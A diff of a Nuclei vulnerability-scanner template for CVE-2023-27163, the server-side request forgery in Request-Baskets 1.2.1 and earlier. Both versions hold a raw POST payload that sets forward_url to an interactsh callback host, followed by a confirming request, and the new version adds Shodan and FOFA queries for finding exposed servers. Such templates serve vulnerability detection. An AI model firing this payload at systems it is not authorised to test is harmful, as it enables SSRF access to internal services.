@@ -1,78 +1,68 @@
 id: CVE-2023-27163
 
 info:
-  author: Esonhugh-self-maintained
-  name: CVE-2023-27163 request-baskets ssrf
-  severity: high
+  name: Request-Baskets <= 1.2.1 - Server Side Request Forgery
+  author: Jaenact
+  severity: medium
   description: |
-    This is a SSRF vulnerability in the request baskets (web application). 
-    https://github.com/darklynx/request-baskets
+    Request-Baskets <= 1.2.1 allows unauthenticated SSRF via the forward_url parameter when creating a new basket.
   reference:
-    - "https://notes.sjtu.edu.cn/s/MUUhEymt7"
-    - "https://github.com/advisories/GHSA-58g2-vgpg-335q"
-  tags: ssrf,proxy,oast,cve,cve2023
+    - https://github.com/darklynx/request-baskets
+    - https://hub.docker.com/r/darklynx/request-baskets
+    - https://infosecwriteups.com/exploit-analysis-request-baskets-v1-2-1-server-side-request-forgery-ssrf-688fffd1f424
+    - https://nvd.nist.gov/vuln/detail/CVE-2023-27163
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 6.5
+    cve-id: CVE-2023-27163
+    cwe-id: CWE-918
+    cpe: cpe:2.3:a:rbaskets:request_baskets:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: darklynx
+    product: request-baskets
+    shodan-query: http.html:"Request-Baskets"
+    fofa-query: body="Request-Baskets"
+  tags: cve,cve2023,ssrf,request-baskets,oast,proxy
+
+flow: http(1) && http(2)
 
 variables:
-  basket: "{{ rand_base(5) }}"
-  ssrf_url: "{{ interactsh_url }}"
+  bucketname: "{{rand_base(7)}}"
 
 http:
   - raw:
       - |
-        POST /api/baskets/{{basket}} HTTP/1.1
+        POST /api/baskets/{{bucketname}} HTTP/1.1
         Host: {{Hostname}}
-        Accept: application/json, text/javascript, */*; q=0.01
-        X-Requested-With: XMLHttpRequest
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
-        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-        Origin: {{BaseURL}}
-        Referer: {{BaseURL}}/web/lep1qbi
-        Accept-Encoding: gzip, deflate
-        Accept-Language: zh-CN,zh;q=0.9
-        Connection: close
+        Content-Type: application/json
 
-        {"forward_url":"{{ssrf_url}}","proxy_response":true,"insecure_tls":false,"expand_path":true,"capacity":200}
-
-    extractors:
-      - type: dsl
-        name: path
-        dsl:
-          - " basket "
-      - type: json
-        name: token
-        json:
-          - ".token"
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 201
-      - type: word
-        part: header
-        words:
-          - "Created"
-      - type: word
-        part: body
-        words:
-          - "token"
-
-  - path:
-      - "{{BaseURL}}/{{basket}}"
-      - "{{BaseURL}}{{basket}}"
-
-    extractors:
-      - type: dsl
-        name: Content
-        dsl:
-          - " body "
-    matchers-condition: and
+        {
+          "forward_url": "http://{{interactsh-url}}",
+          "proxy_response": true,
+          "insecure_tls": false,
+          "expand_path": true,
+          "capacity": 250
+        }
 
     matchers:
-      - type: status
-        status:
-          - 200
+      - type: dsl
+        dsl:
+          - 'status_code == 201'
+          - 'contains(body, "token\":")'
+          - 'contains(content_type, "application/json")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET /{{bucketname}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
       - type: word
         part: interactsh_protocol
         words:
           - "http"
-# digest: 4a0a00473045022100d9ff4be604d06047405933ad6316f1db497307ba97497af5f8c0f80776e8efd802202663a4460327e15e2cadf019e2d510c408a6f086333ee07c7704ee5267af1628:569246fd1e83ae0648e1a21ffb4fe811
+# digest: 4b0a00483046022100eb3283d6f5671ba21b9ece0b1ebeda5760a96122c9a8487c6baea8f09e209707022100d28dd1e326d13dae5b7a0bcba7a8ecca4feadee7ab52657d9a6a121bac22239b:922c64590222798bb761d5b6d8e72950
